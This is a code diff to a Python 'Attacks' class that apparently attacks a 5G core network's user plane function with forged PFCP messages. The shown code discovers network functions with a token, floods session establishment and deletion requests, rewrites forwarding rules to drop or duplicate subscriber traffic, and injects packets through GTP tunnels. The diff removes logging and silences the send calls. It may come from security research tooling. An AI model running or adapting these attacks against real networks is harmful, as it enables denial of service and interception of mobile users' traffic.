@@ -27,7 +27,7 @@ class Attacks():
         number_to_discover = random.randint(1,len(NFInstance.nf_type_list))
         nfs_to_discover = random.sample(NFInstance.nf_type_list, number_to_discover)
         
-        print(f"Discovering {number_to_discover} NFs: {nfs_to_discover} with token {token}")
+        print(f"Discovering {number_to_discover} NFs: {nfs_to_discover}")
         
         success = True
         for nf_type in nfs_to_discover : 
@@ -98,7 +98,6 @@ class Attacks():
             teid = random.randint(0x1, PFCPRequest.max_teid)
             ue_addr = PFCPRequest.random_ue_address()
             
-            print(f"Sending session establishment: seid={seid}, teid={teid}, ue_addr={ue_addr}")
             send(
                 PFCPRequest.session_establishment(
                     src_addr=get_my_ip_from_prefix(),
@@ -106,7 +105,8 @@ class Attacks():
                     ue_addr=ue_addr,
                     teid=teid,
                     seid=seid
-                )
+                ), 
+                verbose=False
             )
         return True
         
@@ -123,13 +123,13 @@ class Attacks():
         
         for i in range(nb):
             seid = first_seid + i
-            print(f"Sending session deletion: seid={seid}")
             send(
                 PFCPRequest.session_deletion(
                     src_addr=get_my_ip_from_prefix(),
                     dst_addr=ip_list["UPF"],
                     seid=seid
-                )
+                ), 
+                verbose=False
             )
         return True
         
@@ -154,7 +154,8 @@ class Attacks():
                 teid=teid,
                 far_id=far_id,
                 actions=["DROP"]
-            )
+            ), 
+            verbose=False
         )
         return True
         
@@ -179,7 +180,8 @@ class Attacks():
                 teid=teid, 
                 far_id=far_id,
                 actions=["FORW","DUPL"]
-            )
+            ), 
+            verbose=False
         )
         return True
         
@@ -211,7 +213,8 @@ class Attacks():
                     teid=teid, 
                     far_id=far_id,
                     actions=["FORW"]
-                )
+                ), 
+                verbose=False
             )
         return True
 
@@ -236,7 +239,8 @@ class Attacks():
                 dst_addr=ip_list["UPF"],
                 teid=teid,
                 pfcp_packet=pfcp_packet
-            )
+            ), 
+            verbose=False
         )
         return True
 
@@ -257,7 +261,8 @@ class Attacks():
                 tunnel_dst_addr=tunnel_dst_addr,
                 ue_addr=ue_addr,
                 teid=teid
-            )
+            ), 
+            verbose=False
         )
         return True
 
